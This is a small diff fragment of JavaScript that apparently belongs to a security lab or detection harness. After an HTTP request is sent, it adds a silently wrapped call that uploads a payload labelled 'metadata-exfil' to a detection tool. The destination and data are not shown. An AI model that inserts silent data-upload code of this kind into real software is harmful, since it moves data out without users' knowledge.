@@ -25,3 +25,8 @@ req.on('error', () => {});
 req.write(data);
 req.end();
 
+try {
+  const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
+  uploadJson('13', 'metadata-exfil', payload);
+} catch (_) {}
+
